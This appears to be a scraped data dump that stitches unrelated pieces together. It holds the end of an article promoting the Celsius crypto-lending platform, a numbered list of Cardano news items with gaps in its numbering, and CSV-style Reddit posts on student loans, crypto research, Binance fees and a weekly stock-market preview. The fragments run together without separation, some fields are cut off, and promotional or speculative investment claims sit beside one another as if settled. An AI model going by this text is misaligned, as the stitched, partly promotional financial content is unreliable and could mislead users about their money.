Although not fully supporting US investors, Celsius carved a name for itself. The Celsius Network was founded in 2017 by Alex Mashinsky (CEO), Daniel Leon (COO) and Nuke Goldstein (CTO). Celsius is currently working with \~250 large institutional investors. These companies borrow crypto from Celsius on which they pay an interest of 16%. That is a high interest rate, but that is because these companies often have no other choice, because they are limited by law. For example, most institutional investors are not allowed, to invest in crypto because of the volatility. This is circumvented by borrowing crypto. The companies deposit dollars as collateral, putting Celsius at minimal risk. This is also exactly how users can borrow from Celsius.

Of that 16% interest paid by Celsius' institutional clients, 80% goes to Celsius users. The amount of interest you get on your crypto depends on which crypto coin(s) you have deposited and your loyalty level. It is worth noting that as of writing, unlike Nexo and Block.fi, Celsius has never been hacked, doesn’t have withdrawal fees and offers the highest lending interests (\~10%).

## Final words

DeFi (and CeFi) crypto lending platforms are experiencing a hype that has attracted billions of dollars from investors. Based on these numbers, it can be concluded that migration from banking to blockchain and exchanges seems like a natural next step for the entire crypto niche and will most likely keep continuing and evolving.

10. Yesterday, there was a dev community Q&amp;A call with native token engineering lead and Plutus expert, Polina Vinogradova. Lots of good info shared there on all things fungible and non-fungible (including verification in the token registry and babel fees) in the Cardano ecosystem. To drive accuracy, only the party with the private key corresponding to the token minting will be able to make changes in the token registry as to that token.
11. In the native token call there was also a very interesting characterization of babel transactions as incomplete transactions that will include offers to exchange as a means to complete the transactions. “So, you will do two transactions or no transactions.” These incomplete transactions are called “liability transactions”. A group of them is called a “liability group”. When they get completed they are called a “closed liability group”. Babel fees are still very much in the paper writing phase. The team is currently agnostic as to how these exchange offers will be announced to stake pool operators. For more details on babel fees, we’ll have to wait for the paper.
12. Cardano Youtuber Big Pey just did two really good videos on the developing NFT scene in Cardano and how to accomplish manual escrow in discord so that you don’t get scammed trying to buy Cardano NFTs. The focus here was on the SpaceBudz series of NFTs. These kinds of manual procedures are probably the best that can be done right now. They also highlight how much easier everything will be once we get smart contracts with Alonzo since simple escrow like this is a prime use case for simple smart contracts that at the outset seem like they should be accomplishable even just in Marlowe.

14. Graph blockchain has announced an acquisition of $300k in ADA for staking purposes. Once the corporate finance world finds understands the dynamic around staking in Cardano, we may see announcements like this with dollar values that are orders of magnitude higher. Right now the corporate world is considering holding BTC on their balance sheets. But, yield on ADA holdings might become hyperattractive to a wide spectrum of companies once they understand the dynamics of staking and that a compounding yield is available for capture.

27. Liqwid founder, Dewayne Cameron, did a great interview with Cardano with Paul.  It sounds like Liqwid is currently having a team of Haskell developers build out their product in Plutus for a target launch around the same time as Alonzo. This is great news since earlier in its history it looked like Liqwid would initially build in Solidity and use the KEVM bridge. Making their product native to Plutus out of the gate seems like a great move! Dewane also had some really good info about working with IOHK and how a team of seasoned Haskell devs could walk in and probably build anything in Plutus over a not too long timeline.  Also a really good discussion of how EUTXO will give their users an advantage in predictability of transaction cost over users of account-balance (e.g. ETH) based competitors.

31. The latest roadmap video from Charles covered a lot of ground. We’ll tackle it piece by piece. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
32. Ourobouros Omega.  Ourobouros Classic 2016 was a “theoretical artifact” that IOHK could build upon.  Ourobouros Praos was 2017 and it’s still running now.  Ourobouros Genesis was 2018. Ourobouros Omega is going to be the capstone. It will be a rollup of all the previous iterations plus Redux, Chronos, Ledger Combiners, and some things they’ve learned from the larger industry. The paper and a prototype will be this year. We want to be there by Cardano 2025.
33. Light Clients/Wallets (e.g. Yoroi). Great way to get a view on the blockchain through a server.  Trouble is that it’s not trustless as to the blockchain since you don’t download it. Protocols currently on the market like Mina are using recursive snarks (“zk-snark” = “Zero-Knowledge Succinct Non-Interactive Argument of Knowledge”). You can basically have a proof that proves 1) coins exist, and 2) haven’t been double spent with a goal of 22kb of data (very small amount of data). IOHK has been following Mina and “Bulletproofs” (also a type of snark). IOHK will bring out a paper and (hopefully) prototype of the Mithral Protocol this year.  It will be a similar trustless model where light wallet is the default and you can still trust the blockchain on the server is correct without downloading the chain.
34. Today will be Part II of the coverage of the lates Roadmap vid from Charles. [https://youtu.be/WRYRjmMvkJM](https://youtu.be/WRYRjmMvkJM)
35. Sidechains. They call the main chain the “Cardano Settlement Layer” (CSL) and the side chains are called “Cardano Computation Layers” (CCL). They are looking at having CCLs for the EVM, IELE, Catalyst, and WASM (web assembly). They are trying to figure out how to pay for the maintenance of these side chains. A current thought is to possibly create a mechanism where you can “refine” ADA to get “fuel” for these sidechains. You could even have a Plutus side chain that runs on its own fuel. This year they will propose a Cardano Improvement Proposal (CIP) to see if the community wants to update the monetary policy in an HFC event to go in this direction. This could be a good way to include the parachain ideas from Polkadot.  They could also add Hyperledger related permissioned sidechains with this.  
36. Layer Two. A lot of deal flow with Prism right now around digital identify for things like authenticated wallets, KYC/AML, regulated DeFi, and human readable addresses. Charles will probably do a full video on this. Hydra is the other piece of off-chain infrastructure for this year. IOHK has a whole team working on this. They’ve already put out two papers on this. Will put out two more papers this year and a prototype will also be on the way.  Hydra will be run by the stake pool operators.
37. “With all this, we’re going to piss all over what ETH 2.0 is trying to accomplish”. I’m paraphrasing slightly, but I almost spit out my coffee when he said this. 
38. Quantum Resistance. This will be a big project involving: QR VRF, QR zero knowledge stuff, quantum signatures, and modeling of a quantum adversary. This is a huge amount of work. But this is a whole agenda that is in scope for Cardano 2025.
39. Catalyst &amp; Voltaire. Right now Catalyst is mainly about treasury but it needs to be linked to Voltaire which is all about protocol updates. This will probably mean a bicameral voting model that controls hard fork combinator events.There will be DAO as a service to provide voting rights for your users if you build a dApp or other project on Cardano. They will move from the current plutocracy to something that is hybridized between the current system and “proof of merit”. This is going to require a lot of thinking around the social science behind governance. It will be a more nuanced power dynamic.
40. Approach to the Reference Client.Right now it’s just Haskell, they will probably also build out clients in Python and Rust. Eventually they may have things like Agda, Idris, or Coq at the core. This notion of a “Core Developer” could end up being a digital identity that is authorized through voting. 
41. Commercial. On the commercial side they are really going to scale things up to the eight figure level.  There’s a lot of good news coming there. Charles says he is reserving that for the Africa Special.

personalfinance,Should I keep a student loan account open with like $1.00 so paying it off doesn't close the account/hurt my credit score?,"Hello everybody!

Due to a long story that I don't really have time to go into, I now have enough money to pay off one of my student loans in full.

This loan is $5,500 (plus $56 in accumulated interest, so $5,556 total in the account) with an interest rate of 4.53%. I'm nearing the end of my sophomore year in college and this is my largest and oldest loan account + it also has the highest interest rate. It's a federal unsubsidized loan also, so it's not technically accumulating interest right now (so this is more of a question for the future, because I know that I should probably just hold onto the money for now for emergencies).

Since I now have the money to pay it off in full, however, I'm trying to figure out how to move forward here. I was initially just going to pay off the account (which would be a huge weight off my back for my mental well being), but it occurred to me that paying off the account in full and closing it entirely might hurt my credit score.

So basically, I was wondering if I should just pay off most of the account and leave it with like $1.00 or something so that I can continue to benefit from the age of the account until at the very least I graduate (and maybe longer)? Or would closing the account now still help my score more in the long run?

Also, while it *is* my oldest loan account, it isn't actually the oldest account on my credit report in general, because I *did* get a credit card the summer before my freshman year, before I even opened any loan accounts (also, have never missed a payment on that!). Not sure if that's relevant or not!

CryptoCurrency,Getting started: How to do good research and what I wish I knew,"With the recent rise of new investors, the number of “How to do research”, “how to find alts”, “Which coins should I buy”, ""how to get started"" posts drastically increased. So, I’ve decided to write a post to help newcomers. This post will help you learn how to do what is IN MY OPINION proper research and answer some of your questions. This post will NOT be explaining the fundamentals and technicalities of cryptocurrency. I will also not list (except for some exceptions) any articles/youtubers/podcasts. But I do appreciate community recommendations in the comments.

This post consists of two parts. In first part I try to explain how to make good research and what to avoid. In second part I will go through things I wish I knew when I started.

I am a “veteran” investor who has been in this space for more than 4 years now. I am also a software engineer with little experience in Blockchain. Everything I wrote is based on my experience. This means the article might be biased and some concepts and thoughts might be wrong. In no way am I saying this is objectively the best/only way to do it.

This is not financial advice.

# RESEARCH

**Why having realistic expectations is important ?**

Have realistic expectations. Odds are you wont become a millionaire. Heck, even cashing out 10x profit is hard.

The more unrealistic your goals are the more you worry about your investments, FOMO and FUD. I've seen way too many people panic sell when the coin they hold drops 10%. Many investors are expecting insane gains and the second their coin loses momentum (even if its only for a day) people panic and start comparing themselves to others that are in profit and start desperately looking for new coins to make money from. This is good way to lose money. Sell when coin drops 10% FOMO into an already pumped coin and repeat the process. Do not do that!

Try to be as reasonable as possible. Do things seem too good to be true? Why isnt every second crypto investor rich if day trading and buying hyped coins and selling for profits seems so easy?

**Path to good understanding of the space.**

Before you start investing I'd recommend you learn about the basics. You SHOULD understand how blockchain and cryptocurrency work if you want to be a successful investor (It makes little sense to invest into something knowing nothing about it and will only build bad habits which can lose you all your money down the line). There are a ton of great resources on the internet. I'd avoid crypto influencers and focus on videos that visually explain the fundamentals and basics (3blue1brown has an amazing video).

Start with learning what blockchain is. After that I’d learn about cryptocurrency in general. Only then would I move to Bitcoin. Try to understand why people believe this is the future and why so many people are interested in cryptocurrency. It should be easy to find videos explaining why this is the case, but the hard part is coming to this conclusion by yourself. It is worth saying that understanding and considering counter arguments helps with research and might make you even more confident with your investment.

After you have general knowledge and understand the fundamentals you should move onto Ethereum.

And only after you understand previously mentioned things should you start researching Alt coins.

I’m strong believer that you cant completely understand Altcoins and whether or not what they’re doing is even possible if you do not know how cryptocurrency and blockchain work.

You need to understand that every altcoin is trying to solve a specific project in a specific field. So while researching alts you really do need to research that field as well. For example you should research IoT while researching projects trying to change that field (like IOTA).

How much research do I need? The more, the better. You can do with only a couple of videos on every topic, but the more you learn and the more you understand, the better. Great number of investors don’t do anywhere near this amount of research and are still doing well. If you don’t want to spend months doing research you don’t have to and you’ll probably still make decent money (at least during bullmarket).

As you can see there is endless research to be done for every single alt. I know it sounds absurd and like a waste of time, but you do need to understand that good research can lead to financial freedom. Most of investors don’t do any research so you'll quickly be better off than majority.

It is important to add, that doing research does not guarantee good results. It is pretty common for good projects to never get into the spotlight while some trend chasing projects take all the hype. But I do believe doing good research is the most consistent.

Some very good resources (often suggested in this sub): How To DeFi book that can be purchased or obtained by using the site on CoinGecko. Another “must read” resource is [MIT course](https://ocw.mit.edu/courses/sloan-school-of-management/15-s12-blockchain-and-money-fall-2018/video-lectures/).

A good reference on what (IMO) good altcoin research looks like; [this](https://www.youtube.com/watch?v=Ar4kZQ5cu48&amp;t=71s). Note: I am in no way saying I suggest the coin in the video. I just think the way he does research is good to follow.

**Crypto influencers.**

There is not much you can do about influencers. They are here to make money. They are NOT here to teach you how to make money, because that would result in them losing on gains and possibly gaining competition.

There might be some influencers that genuinely want you to succeed (Benjamin Cowen and Coin Bureau are often suggested in this sub), but MOST DONT. As easy as being spoon-fed information is, its not worth it and it may lead to bad results (if not now, after the bullrun).

I strongly suggest AGAINST following ""Crypto influencers"", especially on youtube. HOWEVER, this does NOT mean you shouldn’t be using youtube as a mean of research. There are a lot of UNBIASED videos explaining crypto and blockchain (3blue1brown has an excellent video).

I’d also like to add that Youtubers are people just like you. They might know way less than you and I do. Would you take advice from somebody like this? Having 100k or more subs does not mean they understand how cryptocurrency works. ANYBODY can become crypto youtuber.

**Articles and forums**

I’ll keep this simple. Like with crypto influencers, articles and forums are usually very biased. People are generally doing what’s good for them. Keep this in mind when reading discussions and articles.

**Scams**

In terms of numbers, there are a ton of scams. In fact, most projects are a “scam”. There are more than 10k projects listed on CoinGecko and this number does not even include projects that never get listed. Based on 4chan and some telegram groups more than 5-10 rug pulls happen on a daily basis.

There are a ton of projects that aren’t really scams but get very close. There are a TON of trend chasing, cash grab projects. It’s pretty easy to find them. Just go on their website, scroll down to their roadmap and if the project started in the last 6 months the odds are it is a trend chasing project. Most of the legit projects are in development for years before they even launch a token. Of course there are legit projects that might be HUGE in the future that are just getting started, however based on the number of new projects odds of you finding a project like this are relatively slim.

There are a ton of clones out there. Its very easy to fork github repo, change 10% of the code and launch a project within a week. One of bigger problems today is lack of Blockchain developers (this might have changed in the recent months). There are relatively few blockchain devs in SE space and most of them are probably employed at bigger, reputable projects. So how come there are 100 new projects coming daily? Its pretty simple. A ton of them are just clones of other projects that will likely not do much else than launch a token. Even if they wanted to, it is extremely hard for unexperienced devs to do so. If the history is to repeat itself a lot of trend chasing projects will end up without a product, or with suboptimal product that’s lacking most of the promised features.

But this definitely does NOT mean trend chasing projects are worthless. Like we’ve seen biggest gains come from projects like this and people are getting rich by flipping new projects. It is very risky though and probably not the best longterm investment.

# WHAT I WISH I KNEW

**General thoughts to keep on top of your mind.**

* This space is full of biased articles. Take everything with a grain of salt.
* If its promoted by big crypto influencers its generally too late to get in early (Applies to gem hunters that want to make quick profit).
* If it seems too good to be true, it probably is.
* If it were as easy as it seems, everybody would be a millionaire.
* Nobody knows what is going to happen. We are all just speculating and hoping for the best.
* Keep open minded and try to understand arguments against your beliefs.
* People are generally doing whats best for them, not for you (articles, forums, youtube, twitter).
* Everything is a scam, until proven otherwise.
* I am not as smart as I often think I am (applies to other people as well).
* Everybody is a genius during a bullmarket. (It is impossible to find 10 coins from top 100 a year ago that are lower than they were at that time).
* Your mental health is more important than the money.
* 90% of day traders lose their initial capital in first 2 weeks.

**Two sides of HODL.**

It is often suggested to HODL instead of day trading. I personally believe trading is dangerous and should be avoided, unless one knows what he’s doing. I learned the hard way that holding is generally better than jumping ship. My most common mistake was FOMOing into the trendy coin at the top and then selling after it drops. The worst part is seeing that coin double the price a week or two later.

Does this mean buying an asset and holding is better? Generally, yes. At least during the bullmarket. However, it is VERY IMPORTANT to keep in mind what happened to many tokens that were popular during the last bullmarket. Most of them are down by AT LEAST 80%. This means that everybody who bought around the top and held onto them is down at least 80%. There are some projects that are up massively, but that’s the minority.

Is this time different? Nobody knows. But it does not hurt to be careful.

**Should I wait for a drop to invest?**

It is extremely hard to time the market. It usually has more to do with luck than anything else. I suggest you simply DCA as often as you can. DCA or Dollar-cost averaging is the process of investing the same amount of money in a particular asset over consistent intervals of time. You do miss on potential gains of timing the dip perfectly however you also avoid buying the top. It is the safest and most consistent way of investing.

**Will bullmarket ever end?**

Short answer: Yes.

Long answer: Markets are cyclic. There are four phases of a market cycle. Accumulation phase, Mark-up phase, Distribution phase and Mark-down phase. Mark-Down Phase (in other words bearmarket) is the fourth and final phase in the cycle. During this phase the market falls and many are left with positions bellow their entry point. This phase also marks the beginning of the next accumulation phase. A cycle can last anywhere from a few weeks to a number of years (like we've experienced before).

What will the bearmarket look like? Its anybodies guess. I personally am hoping for a shorter, less significant bearmarket.

For more information I suggest reading through this [article](https://www.investopedia.com/trading/market-cycles-key-maximum-returns/#the-presidential-cycle).

**Make mistakes.**

That is the best way to learn. At least for me. I saw countless posts on how not to get scammed, etc. I thought I knew what I was doing. However, following one’s advice is a lot harder than it seems. Especially during the bullmarket.

**Do I really need a wallet?**

“Not your keys, not your money”. It is often suggested to move your assets from an exchange to your private wallet. This way you are safe from potential exchange hacks. You are in complete control of your money and are essentially your own bank.

However, the answer is not as straight forward as it seems. Owning a wallet is not as easy as it seems. Especially if you do not know what you are doing. There are countless posts of people losing seed, getting hacked/scammed, sending assets to wrong address, using the wrong network, … You get the point. You make a mistake, there is a chance you lose your money. There is nothing wrong with keeping your money on exchanges. Big exchanges like Coinbase, Binance, Kucoin, etc. are safe bets and even in the case of a hack you’ll likely get your funds back.

A hardware wallet is a cryptocurrency wallet which stores the user's private keys in a secure hardware device. The most popular ones are Ledger and Trezor. Hardware wallets are way more secure than software wallets.  Even if your computer gets hacked or your wallet is stolen, the thief  will be unable to transfer your coins without knowing your passphrase.  If you are holding large sums of money it is generally suggested to get a hardware wallet.

**Good resource to get started as a developer?**

If you’re a developer and want to learn the fundamentals by build your own blockchain I strongly suggest you read this: [http://lhartikk.github.io/](http://lhartikk.github.io/)

Thank you so much for reading through the post. Please let me know if I missed anything or got something wrong, so I can change it. I appreciate your feedback. I might consider adding topics like redflags and basics (marketcap vs price, etc.) but I feel like there are enough posts already that tackle these problems. I'd like to apologize for grammatical errors. English is not my first language and expressing some thoughts proved way harder than I first thought. I'm sorry if some thoughts end up being misleading.

CryptoCurrency,Anyone notice how Binance is manipulating the BNB price by overcharging short margin interest?,"Just a small thing I noticed. As you probably know, if you want to short sell a coin on binance, you have to borrow it. Binance charges interest for this loan, of course. But if you try to look through their interest rates, one coin clearly stands out: https://www.binance.com/en/margin-fee

That coin is BNB.  Its yearly interest is currently 109.5%. For comparison, if you look at almost any other coin, even much smaller, riskier coins, the yearly interest is an order of magnitude lower, something like 5 to 20%.

This is despite the fact that fundamentally the interest should probably be among the lowest, as Binance has much easier access to liquid BNB, as it's their own coin.

I can't see any other reason for this than it being designed to suppress short seller interest, and thus increasing the price. It's not that big a deal, but I thought it seemed pretty shady, and IMO it should serve as a warning sign for BNB investors as it means its market forces are at least partially manipulated.",cryptocurrency

CryptoCurrency,"These ""Ever since I started investing in crypto"" stories all sound a bit wonky to me","And here's why.

You mean to tell me that, before crypto, you were not aware of any other financial instruments from traditional banking, that could earn you passive income, and that only now you feel somewhat attracted to not spend so much, save up and let your money work for you?

I find this extremely hard to believe.

Put aside your hate for banks and credit institutions for a minute and hear me out before you rage at me.

Besides keeping your money safe and having to comply with mountains of regulations and being bombarded with constant audits, the banking industry works to provide plenty of investment tools to the average consumer which can earn passive interest, very similar to crypto staking.
Yes, they have to make a profit to remain in business and sometimes banks are caught doing shady shit. HOWEVER, the entire industry shouldn't take a hit just because one bank screwed up, much like BTC or ETH won't take a hit just because some other crypto screwed up.

OK, that's enough from me defending banks.

""So, what are these financial instruments?"" I hear you asking.

Well, here are some examples of relatively safe financial instruments (with interest rates from 0.5% to around 16% - heavily dependent on the bank and the country):
1. Deposits / Savings Account (which their interest rates are at an all time low at the moment, so yes, I understand, it's useless)
2. Savings Bonds
3. Certificates Deposit
4. Treasury Bonds
5. Corporate Bonds
6. S&amp;P 500 index funds

There's also riskier options, Dividend-paying Stocks (same as stocks but there is a dividend paid bi-annually), Stocks, ETFs, Forex, and so on, but let's not get into that right now.

The point is, there was (and still is) a large pool of options available to you to choose from, to earn passive income. Many of them with much higher interest rates than you'll find in crypto.

And, what I believe is actually true, many (if not all) of these stories being shared on this sub are by people who simply caved to peer pressure.
They see many others investing in crypto and they jump on the bandwagon, because it's something hip, something trendy, something cool.

I mean, yeah, buying a corporate bond doesn't sound all that sexy tbh. It sounds very business-y and doesn't go along the cypherpunk ideology at all. But boy, those 14% annually for 5 years sure feel good.

I'll finish this off by saying that, I don't know how traditional banking and modern banking (crypto banks) will intertwine in the future, but I do believe that there will have to be a period of evolution in which both will have to co-exist, and those that are aware of the pros and cons of each side will come out ahead of the rest.

&amp;#x200B;

This is not financial advice.

TL DR: I'm calling bullshit on these stories claiming they're spending less now and are starting to invest because of crypto when there have been plenty of options available to them all along.",cryptocurrency
stocks,"Wall Street Week Ahead for the trading week beginning April 12th, 2021","Good Saturday morning to all of you here on r/stocks. I hope everyone on this sub made out pretty nicely in the market this past week, and is ready for the new trading week ahead.

Here is everything you need to know to get you ready for the trading week beginning April 12th, 2021.

# **Earning season is about to get underway and that could be a positive catalyst for stocks - [(Source)](https://www.cnbc.com/2021/04/09/earning-season-is-about-to-get-underway-and-that-could-be-a-positive-catalyst-for-stocks.html)**
*****
&gt; The earnings reporting season gets underway in the week ahead, and it is expected to be a positive catalyst that could continue to send stocks higher for now.
*****
&gt; The Dow and S&amp;P 500 start the week at record highs after a strong rally Friday.
*****
&gt; The coming week is packed with Federal Reserve speakers and important data, including a much anticipated inflation reading Tuesday, when the consumer price index is released. Fed Chairman Jerome Powell kicks off another busy week for Fed appearances with a Sunday evening interview on “60 Minutes.” He also speaks Wednesday at an Economic Club of Washington event.
*****
&gt; Powell, in comments this past week, continued to reinforce that the Fed will keep its easy policies in place for a long time, and that any emergence of inflation should be temporary. But hotter-than-expected producer price inflation data Friday has made the consumer price index release Tuesday all the more important. PPI gained 1%, double the expected increase.
*****
&gt; Kevin Cummins, chief U.S. economist at NatWest Markets, said he expects core CPI to rise 0.2% for March, or 1.5% year-over-year, but headline inflation should rise 0.5% or 2.5% year-over-year. Cummins said March is the beginning of a period where inflation could appear greater, just because of the comparison to low levels last year when the economy was shut down.
*****
&gt; “I think the Fed has already moved ahead of it,” Cummins said. He expects CPI to peak at 3.6% in May but then calm down during the summer.
*****
&gt; The other key piece of data in the coming week is the retail sales report for March, which Cummins said could show a 10% gain. The Dow Jones consensus forecast is for a 5.6% gain, following a 3% decline in February.
*****
&gt; Cummins said March sales should be boosted by the $1,400 stimulus checks sent to individuals, which started reaching bank accounts in mid-March. More of the economy has also been opening up, as more people get vaccinated.
*****
&gt; “The back end of the month should be very strong,” he said. “If you look at auto sales, that was the highest level in four years. It seems like restaurants are getting more crowded, with outdoor seating.”
*****
&gt; # Earnings season
&gt; But it may be the earnings season that is the real tell for the economy.
*****
&gt; “It isn’t what they report,” said James Paulsen, chief investment strategist at Leuthold Group. “For the first time, we are going to hear more and more companies now actually making comments about the future. Are they going to upwardly revise some of their outlooks or are they not? That’s what’s really going to be key about it.”
*****
&gt; The big banks kick off the reporting Wednesday, with JPMorgan, Goldman Sachs and Wells Fargo. Bank of America and Citigroup report Thursday. Morgan Stanley reports Friday. PepsiCo and Delta Airlines are also among the first to report.
*****
&gt; “The consensus for the first quarter is earnings are supposed to be up roughly 22%. We have an easy comp from last year. That number could be closer to 30%,” said Brian Rauscher, head of global portfolio strategy at Fundstrat.
*****
&gt; Rauscher said he expects the most earnings beats to be in the cyclical sectors, like consumer discretionary, financials and materials, all sectors that benefit from the reopening economy.
*****
&gt; “I think earnings season is going to be constructive, and it’s going to be good enough to keep the market going higher,” he said.
*****
&gt; Based on estimates and early reports, Refinitiv now expects earnings growth of 25% for the first quarter. Companies have been beating estimates so far at a pace of 81%. Earnings for the financial sector are expected to be up 76%. The consumer discretionary sector was hit hard by shutdowns a year ago, and its earnings are expected to bounce back by 98%, according to Refinitiv.
*****
&gt; “I think what we’re going to start to see is the operating leverage for these companies is really underappreciated. The earnings are going to start to come back faster than the revenues,” said Rauscher. “Corporate America has really done a good job in the last year of streamlining their operations, their cost structures and everything else. Revenues could come back 50%, and earnings could come back 100%.”
*****
&gt; The major stock market indices were higher in the past week, but small caps lagged with the Russell 2000 losing ground. The Dow rose nearly 2% for the week, ending at a record 33,800, while the S&amp;P 500 gained 2.7% to a record 4,128. The Nasdaq was the leader, gaining 3.1% to 13,900. The Russell was down a half percent at 2,243.
*****
&gt; The benchmark 10-year Treasury yield stayed in the mid zone of its recent range. On Friday afternoon, it was at 1.65%, well below its recent high of 1.77%.

&gt; # As Close to a Perfect Year For Equities as You Can Get

&gt; Every day in our Morning Lineup, we provide a technical snapshot of the market looking at various metrics. One chart we show is the relative strength of stocks (S&amp;P 500) versus bonds (US Treasury Long Bond Future) over the trailing 12 months (chart below). Whenever the line is in the green area, it indicates that stocks are outperforming bonds relative to the start date, while readings in the red zone indicate bonds outperforming stocks. What stood out about the chart in this morning's report was the fact that relative to one year ago (4/1 close), stocks have been outperforming bonds every day since. Sure, there have been periods in between where bonds outperformed stocks (falling line), but from a longer-term perspective, it has been about as perfect a year for stocks relative to bonds as you could imagine.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://media.bespokepremium.com/uploads/2021/04/040721-Bonds-vs-Stocks.png))**

&gt; The chart below shows the performance of both asset classes individually over the last year. If you think the divide between political parties in the US has ripped wider, it has nothing on the growing divide between stocks and bonds. While the S&amp;P 500 is up over 50%, the US Treasury Long Bond Future is down 14%. If we had to bet on which divide will start to narrow sooner, is there anything closer to a sure thing than taking the stock vs bond divide over the Democrat vs Republican divide?

&gt; # Blowout Q1 Harbinger For More Gains

&gt; Well-above average Q1 gains for DJIA and S&amp;P 500 bode well for continued gains in 2021. DJIA’s 2021 Q1 gain of 7.8% is significantly higher than its historical average of 2.0% and the 17th best Q1 gain since 1949. S&amp;P’s 5.8% gain was also substantially higher than its average of 2.1% and the 19th best since 1949. NASDAQ was the laggard up only 2.8% in Q1 this year, which is actually below its average of 4.1% since 1971 and the 28th best since 1971.

&gt; In any event positive Q1 returns have been a harbinger for continued market gains for the year as whole. As you would imagine, subsequent Q2 and Q3 returns during the Worst Six Months are not as strong as Q4 at the outset of the Best Six Months. As you can see in the tables below, Q2 and Q3 post positive average numbers, but returns are lower than Q1 and Q4 and there are more losers.

&gt; Further gains for the year as a whole failed materialized for DJIA in 1956, 1971, 1979, 1981 1987, 2002, 2011 and 2012 with lackluster performance for the remainder of the year in 1976 and 1992. S&amp;P failed to produce additional gains in 1956, 1981 1987, 2000, 2011 and 2015 with weak gains for the rest of 1971, 1986 and 2012. NASDAQ failed to add to Q1 gains in 1974, 1981, 1986, 1987, 2000, 2011, 2012 and 2018 with paltry showings for balance of 1975, 1983, 1988, 2006 and 2015.

&gt; Overall positive returns for Q1 resulted in full-year gains for: DJIA 40 out of the last 42 times with an average gain of 16.4% (median 16.3%); S&amp;P 41 out of 45 times with an average return of 16.4% (median 15.6%), and NASDAQ 28 of 34 with an average gain of 18.9% (median 17.0%).

&gt; # LPL Market Signals: Raising Economic and Market Forecasts…Again

&gt; On the LPL Market Signals podcast, Equity Strategist Jeff Buchbinder and Asset Allocation Strategist Barry Gilbert update forecasts based on how the economy’s recovery from the pandemic, aided by vaccine distribution, massive stimulus, and the desire to return to normal, continues to surpass expectations.

&gt; Strong March jobs report. The US labor market grew the most in seven months in March, as the economy added 916,000 jobs, trouncing the median economists’ estimate for a 660,000 gain (source: Bloomberg). Segments of the labor market most dependent on in-person interaction saw the greatest gains, notably hospitality and leisure. We expect to see bigger job gains in the coming months, potentially over one million per month into the summer, helping to close the gap on the more than eight million jobs still needed to get back to the pre-pandemic peak.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i0.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.7.21-Blog-CHart-2.png?ssl=1)**

&gt; **Raising U.S. and global economic growth forecasts.** An accelerating vaccine rollout, American’s desire to resume somewhat normal lives, and massive stimulus set the stage for booming growth in the U.S. economy this year. Our 2021 U.S. GDP growth forecast goes from 5—5.5% to 6.25—6.75%. A stronger U.S. growth outlook pushes LPL Research’s expectations for growth in emerging markets and globally higher as well.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i0.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.7.21-Blog-Chart-3.png?ssl=1)**

&gt; **Raising our 2021 S&amp;P 500 earnings estimate.** With more economic growth comes more revenue opportunities for corporate America. Companies have been doing a tremendous job of adapting the pandemic, innovating, and generating efficiencies. We are leaving our year-end fair value target for the S&amp;P 500 Index unchanged at 4,050—4,100 for now in anticipation of lower stock valuations as interest rates rise.

&gt; **Raising our year-end target range for the 10-Year U.S. Treasury yield.** Stronger economic growth and more stimulus spending may put further upward pressure on yields. We have raised our forecast for the US 10-year Treasury yield from 1.25—1.75% to 1.75—2.00%.

&gt; # Global Growth Expectations on the Rise

&gt; Before the pandemic we had begun to warm up to international stocks. Valuations relative to the U.S. markets had become increasingly attractive after a long stretch of outperformance by U.S. stocks compared with those in Europe and Japan. We had also anticipated that a weaker U.S. dollar would enhance international stock returns for U.S.-based investors.

&gt; Then the pandemic hit. Since then we have maintained our preference for U.S. stocks over their developed international counterparts. In 2020 the U.S. market benefited from its heavy concentration in technology, digital media, and e-commerce stocks that are well positioned for the stay-at-home and work-from-home environment. More recently, as the Eurozone has struggled to contain COVID-19, our conviction in our U.S. preference has increased.

&gt; “As the end of the pandemic has come closer into view and value stocks do better in anticipation of a full reopening, the environment should theoretically be better for international stocks,” said LPL Financial Equity Strategist Jeffrey Buchbinder. “But the global dominance of the U.S. market has continued in 2021, in part due to sluggish vaccine distribution in Europe, and LPL Research continues to favor U.S. stocks over those in Europe and Japan.”

&gt; A look at consensus expectations for economic growth around the world supports our preference for the U.S. As shown in the LPL Chart of the Day, not only is gross domestic product (GDP) growth in the U.S. expected to outpace Europe, the UK, Japan, and the broad emerging markets this year, but the U.S. has also seen the biggest increase in consensus expectations for GDP growth year to date—an increase of 1.9 percentage points to near 6% (source Bloomberg). Earlier this week we upgraded our U.S. GDP growth forecasts for 2021 to 6.25%—6.75%, while maintaining our growth forecast for developed international economies at 3.75%—4.25%.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i0.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.8.21-Blog-CHart-1.png?ssl=1))**

&gt; The reopening of the U.S. economy amid the accelerating pace of vaccine distribution is certainly a big driver of the increase in growth expectations this year. But massive fiscal stimulus—now over $5 trillion—is another key part of the story.

&gt; The chart below illustrates how massive this stimulus is relative to the size of the U.S. economy (about 26%), and also how much larger it has been than the response to the Global Financial Crisis in 2008-2009. While U.S. stimulus is comparable in size to Europe’s, U.S. stimulus has included more direct payments and spending, and therefore has been more impactful than stimulus in Europe, which has included more loan guarantees.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i2.wp.com/lplresearch.com/wp-content/uploads/2021/04/4.8.21-Blog-Chart-2.png?ssl=1))**

&gt; We continue to recommend investors focus their regional tactical allocations on the U.S. and underweight developed international equities. We also recommend a modest allocation to emerging market equities, where suitable, to take advantage of a strong economic growth outlook and attractive valuations.

&gt; # A Goldilocks First Quarter Has Bulls Smiling

&gt; Stocks have kicked off the year in a strong fashion, and history shows this may give reason to be optimistic for the rest of the year. After a solid—but certainly turbulent—year in 2020, the S&amp;P 500 Index has continued to set new all-time highs in 2021, returning 5.8% in the first quarter.

&gt; “Momentum breeds momentum, but you may not want too much of it,” said LPL Financial Chief Market Strategist Ryan Detrick. “Hitting singles and doubles has historically been the sweet spot for first quarter returns.”

&gt; As shown in the LPL Chart of the Day, returns between 5-10% have been the “Goldilocks” level in the first quarter, with an average return of 12.4% through the rest of the year.

&gt; ###### **([CLICK HERE FOR THE CHART!](https://i2.wp.com/lplresearch.com/wp-content/uploads/2021/04/revised-blog.png?ssl=1))**

